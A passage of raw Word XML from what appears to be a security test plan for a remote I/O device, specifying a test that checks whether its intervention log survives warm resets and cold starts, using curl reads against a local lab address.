      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="63AF7E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D50AE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D1806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>Repudiation + anti-forensic Tampering (evidence deletion via power cycle)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="329DF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1BDB8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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E5728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81DD9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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7EB988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BDC6E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465FE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Demonstrate that a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cold start clears the tracing log</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (intervention data does not persist across a power cycle) and empirically establish the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>warm-reset</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>behaviour</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (undocumented), settling the "survives non-cold-start resets" question.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="612C3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318C4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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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9D27A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1. Populate the log with identifiable entries. 2. Apply a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>warm reset</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (if a warm-reset path exists); read the log. 3. Apply a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (power cycle); read the log. 4. Compare: confirm cold-start clearing; record whether warm reset preserves entries.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="49864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42A1E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0B616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  <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> entries persist across both reset types. </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL for cold start:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the log is empty after cold start → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and CR 3.9 non-conformity. </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t>Warm-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>reset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>result</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>recorded</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>factually</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F638E5C" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282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6507"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="2D0166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59434D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77BFAF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r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="3F143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2AD15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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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6BED8" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>TC-RQ012-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="3D639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BA47D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21099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DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; power switch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="639BF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D1A19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EF724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>curl (log + uptime read); power control</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70DB2908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># TC-RQ012-02 Cold-start deletion + warm-reset clarification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C21CAE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>./induce_event.sh 1; ./induce_event.sh 2; ./induce_event.sh 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD313F5" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId313" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1202_log_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB16230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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId314" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1202_tick_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F10B085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># --- (a) WARM reset (if available) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E509310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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId315" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1202_log_warm.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5426C838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lastRenderedPageBreak/>
        <w:t># --- (b) COLD start (power cycle) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDBEC66" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId316" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1202_log_cold.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06090004" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId317" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1202_tick_cold.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22524FC7" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>diff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC1202_log_pre.json TC1202_log_cold.json | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>tee</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC1202_colddiff.txt # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>expect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>cleared</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4ACB5338" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Cold start → log </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>empty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-6521), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>uptime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> reset (SRIO-15398); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>warm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">-reset </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>recorded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>empirically</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>docs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>silent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">). | | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Cold start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>clears</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> log (G-1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>confirmed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">) ☐ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Warm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">-reset </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">: ______ | | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1202_log_pre/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>warm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>cold.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC1202_tick_*, TC1202_colddiff.txt | </w:t>
      </w:r>
      <w:hyperlink r:id="rId318" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="75446195" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="397109F8">
          <v:rect id="_x0000_i1821" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6093F4" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-012)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2318D72D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cross-referenced the firmware-install self-erasing reboot to RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — RQ-012 retains its </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>own</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> structural retention-killer (</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>mandatory annual reboot, SRIO-1812</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) but no longer co-owns the install-reboot clearing (that is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 G-3 / TC-RQ008-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:hyperlink r:id="rId319" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B03A388" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Reframed G-3 as a cross-reference</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the "log excludes physical/incomplete interventions" point is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>collection-completeness</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> matter owned by </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
